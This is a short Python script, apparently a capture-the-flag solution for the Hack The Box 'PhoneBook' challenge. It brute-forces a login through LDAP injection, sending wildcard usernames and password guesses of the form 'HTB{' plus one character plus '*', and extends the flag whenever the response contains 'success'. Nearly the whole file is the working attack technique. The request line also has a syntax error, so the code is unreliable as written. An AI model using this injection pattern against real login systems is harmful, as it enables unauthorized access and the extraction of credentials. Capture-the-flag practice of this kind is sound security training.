import requests
import string

##################################
# 	LDAP BRUTE FORCE SCRIPT 
#		FOR A WEB LOGIN
# 	HTB- PhoneBook Challenge
##################################


# Create a list of brute force carathers with
# lowercase, uppercase, digits and punctuation
pass_chars = string.printable

# Remove * because it matches any char in the injection
pass_chars = pass_chars.replace("*","")

# We look for a password starting with HTB
pass_prefix = 'HTB{'

# Variable to brute force passwords
password = ''

end_flag = 0
while not (end_flag):
	for char in pass_chars:
		# Create brute force passwords	
		password = pass_prefix + char + '*'
		
		# Send request to the web server
		parameters = {'username':'*','password':password}
		ip = 'XX.XX.XX.XX'
		port = 'XXX'
		directory = '/login'
		request = requests.post('http://'+ip+':'port+directory, data = parameters)
		
		#if success, then we found a new password character
		if 'success' in request.text:
			pass_prefix = pass_prefix + char
			if char == '}':
				end_flag = 1
			print(pass_prefix)
			
			
			
			